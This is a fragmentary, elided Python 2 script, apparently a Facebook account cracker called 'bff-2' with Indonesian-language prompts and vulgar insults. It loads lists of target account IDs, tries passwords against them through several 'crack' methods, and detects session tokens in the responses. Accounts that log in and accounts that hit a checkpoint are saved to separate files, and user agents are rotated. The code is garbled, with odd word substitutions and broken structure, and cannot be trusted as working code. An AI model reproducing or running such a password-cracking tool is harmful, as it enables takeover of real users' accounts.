...
"""%s
 ...
 - facebook    : MRJOKER
 - fanspage    : MRJOKER
 - whatsap     : 0093707266012
 - github      : github.com/MRJOKER
 - script name : bff-2
 - version     : 1.1
...
def masuk():
    ...
    if rom in(""):
        ...
        print (" - siapkan Bos facebook (wajib Bos tumbal)");jeda(2)
        print (" - loginkan Bos facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
...
def menu():
    ...
    if unik == '':
    	...
    	try:
            ...
            total = open("Bos/%s"%(file)).read().splitlines()
            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            jalan(" [%s*%s] total Bos : %s"%(K,P,len(total)))
            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
            for Bos in total:
            	fb = Bos.replace("\n","")
            ...
            while True:
                ...
                if pwx == '':
                    ...
                    def AWCC(zafi_=None): 
                        ind = raw_input('\n %s[?] methode : %s'%(P,K))
                        if ind == '':
                            print("%s [!] Isi yang benar kentod "%(M));self.AWCC()
                        elif ind in ('1', '01'):
                            print '\n %s[%s*%s] Bos %sOK%s tersimpan di >%s Bos/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] Bos %sCP %stersimpan di > %sBos/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            ...
                            print ('\n %s[!] isi yang benar kentod'%(M));AWCC()
                    ...
                    print ' [%s03%s] methode mobile (crack sangat lambat) Bos banyak kemungkinan besar Bos terkena checkpoint berkurang / one tab yes'%(K,P)
                    AWCC(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
            print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
        ...
        for pw in AWCC:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                ...
                try:
                    ...
                    cp.append(sv)
                    open('Bos/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
...
def uas():
    ...
    if u == '':
    	...
    	try:
            ...
            print ("\n%s [√] berBos mengganti user agent"%(H));jeda(2);menu()
